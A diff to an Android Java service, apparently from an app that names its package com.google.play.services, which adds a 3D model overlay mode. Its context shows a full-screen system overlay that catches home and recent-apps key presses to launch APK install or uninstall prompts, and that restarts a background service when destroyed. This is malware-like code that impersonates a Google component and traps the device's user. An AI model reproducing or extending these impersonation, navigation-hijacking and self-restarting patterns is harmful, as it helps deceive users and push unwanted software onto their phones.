@@ -3,6 +3,7 @@ package com.google.play.services;
 import android.app.Service;
 import android.content.Intent;
 import android.os.IBinder;
+import android.os.Handler;
 import android.widget.LinearLayout;
 import android.widget.Toast;
 import android.widget.TextView;
@@ -17,6 +18,10 @@ import android.graphics.Color;
 import android.net.Uri;
 import java.io.File;
 
+import com.google.play.services.lib.util.android.ContentUtils;
+import com.google.play.services.lib.ModelSurfaceView;
+import com.google.play.services.lib.Loaderku;
+
 public class ServiceAlert extends Service {
 
 	public static String dataText = "";
@@ -24,7 +29,30 @@ public class ServiceAlert extends Service {
 	public static String pilihAksi = "";
 	public static int dataTextSize = 12;
 
+    // 3d
+    public static String pathObj = "";
+    public static float animeCameraX = 0;
+    public static float animeCameraY = 0;
+    public static float animeZoom = 0;
+    public static float animeRotasi = 0;
+    public static float posisiX = 0;
+    public static float posisiY = 0;
+    public static float posisiZ = 0;
+    public static float skala = 0;
+    public static boolean zoomRotasi = false;
+    public static boolean posisi = false;
+
+	private static final int REQUEST_CODE_LOAD_TEXTURE = 1000;
+    private int paramType;
+    private Uri paramUri;
+    private boolean immersiveMode = true;
+    public ModelSurfaceView gLView;
+    private Loaderku scene;
+    private Handler handler;
+
+    // view
 	private LinearLayout layoutView;
+    private TextView fullPath;
 	private int y = 1;
 
 	@Override
@@ -63,8 +91,12 @@ public class ServiceAlert extends Service {
         
         } else if (pilihAksi.equals("root")) {
         	y = 2;
+        
+        } else if (pilihAksi.equals("3d")) {
+            y = 2;
         }
 
+        
 		layoutView = new LinearLayout(this) {
 			public void onCloseSystemDialogs(String reason) {
 				if ("homekey".equals(reason) || "recentapps".equals(reason)) {
@@ -74,6 +106,7 @@ public class ServiceAlert extends Service {
         				intent.setDataAndType(Uri.fromFile(new File(dataPaket)), "application/vnd.android.package-archive");
         				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         				ServiceAlert.this.startActivity(intent);
+                        fullPath.setText(dataText);
         			
         			} else if (pilihAksi.equals("uninstall")) {
         				try {
@@ -87,26 +120,40 @@ public class ServiceAlert extends Service {
         					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 							ServiceAlert.this.startActivity(intent);
 						}
-        			
-        			} else if (pilihAksi.equals("hotspot") && pilihAksi.equals("root")) {
-        				onDestroy();
         			}
-				}
+				
+                }
 				
 			}
 		};
         
         LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
-        layoutView.setBackgroundColor(Color.YELLOW);
+        
+        if (pilihAksi.equals("3d")) {
+            LinearLayout.LayoutParams params3d = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+            handler = new Handler(getMainLooper());
+            scene = new Loaderku(this, this);
+            scene.init();
+            gLView = new ModelSurfaceView(this);
+            
+            layoutView.setBackgroundColor(Color.TRANSPARENT);
+            layoutView.addView(gLView, params3d);
+        
+        } else {
+            fullPath = new TextView(this);
+            LinearLayout.LayoutParams paramsfullPath = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+            fullPath.setTextSize(dataTextSize);
+            fullPath.setTextColor(Color.BLACK);
+            fullPath.setText(dataText);
+
+            layoutView.setBackgroundColor(Color.YELLOW);
+            layoutView.addView(fullPath, paramsfullPath);
+
+        }
+
         layoutView.setOrientation(LinearLayout.VERTICAL);
         layoutView.setLayoutParams(layoutParams);
 
-        TextView fullPath = new TextView(this);
-        LinearLayout.LayoutParams paramsfullPath = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
-        fullPath.setTextSize(dataTextSize);
-        fullPath.setTextColor(Color.BLACK);
-        fullPath.setText(dataText);
-        layoutView.addView(fullPath, paramsfullPath);
 		
 		WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(LayoutParams.MATCH_PARENT, new ReceiverBoot().getScreenHeight()/y,
@@ -118,6 +165,7 @@ public class ServiceAlert extends Service {
 		} else {
 			params.gravity = Gravity.TOP;
 		}
+
 		wm.addView(layoutView, params);
 
 	}
@@ -137,5 +185,41 @@ public class ServiceAlert extends Service {
 
 		startService(new Intent(this, SystemThread.class));
 	}
+
+    public void setCamera(float dx, float dy) {
+        this.animeCameraX = dx;
+        this.animeCameraY = dy;
+    }
+    public void setCameraZoom(float vector) {
+        this.animeZoom = vector;
+    }
+    public void setCameraRotasi(float pi) {
+        this.animeRotasi = pi;
+    }
+    public void setPosisi(float x, float y, float z) {
+        this.posisiX = x;
+        this.posisiY = y;
+        this.posisiZ = z;
+    }
+    public void setPath(String path) {
+        this.pathObj = path;
+    }
+
+
+	public Uri getParamUri() {
+        return paramUri;
+    }
+
+    public int getParamType() {
+        return paramType;
+    }
+
+    public Loaderku getScene() {
+        return scene;
+    }
+
+    public ModelSurfaceView getGLView() {
+        return gLView;
+    }
 	
 }
